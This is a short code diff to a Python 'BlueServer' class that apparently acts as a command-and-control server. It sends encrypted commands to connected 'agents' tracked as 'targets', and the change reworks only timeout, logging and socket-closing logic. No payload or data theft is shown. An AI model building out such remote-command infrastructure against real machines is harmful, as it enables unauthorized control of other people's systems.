@@ -134,30 +134,28 @@ class BlueServer:
 
     def send_cmd(self, cmd, agent):
         cmd = "cmd|" + cmd
+        agent.sock.settimeout(10)
         try:
             agent.sock.send(self.encrypt(cmd.encode()))
             result = ""
-            start_time = time.time()
-            while True:
-                try:
-                    reply = self.decrypt(agent.sock.recv(65535)).decode()
-                    if reply == "END" or time.time() - start_time > 10:
+            try:
+                while True:
+                    reply = self.decrypt(agent.sock.recv(50000)).decode()
+                    if reply == "END":
                         break
                     else:
                         result += reply
-                except socket.timeout:
+            except socket.timeout:
                     print(str(agent) + " timed out")
+                    logging.error("Socket timeout:" + str(agent) + ":" + self.get_timestamp())
+            print(str(agent) + ":\n" + result)
         except UnicodeDecodeError:
             print(str(agent) + "\nERROR: Unicode Decode Error")
             logging.error("Unicode decode error:" + str(agent) + ":" + self.get_timestamp())
-        except socket.timeout:
-            print(str(agent) + "\nERROR: Socket Timeout")
-            logging.error("Socket timeout:" + str(agent) + ":" + self.get_timestamp())
-            self.connections.remove(agent)
-            return
         except ConnectionError:
             print(str(agent) + "\nERROR: Connection Error\n")
             logging.error("Connection error:" + str(agent) + ":" + self.get_timestamp())
+            agent.sock.close()
             self.connections.remove(agent)
             self.targets.remove(agent)
         except BrokenPipeError:
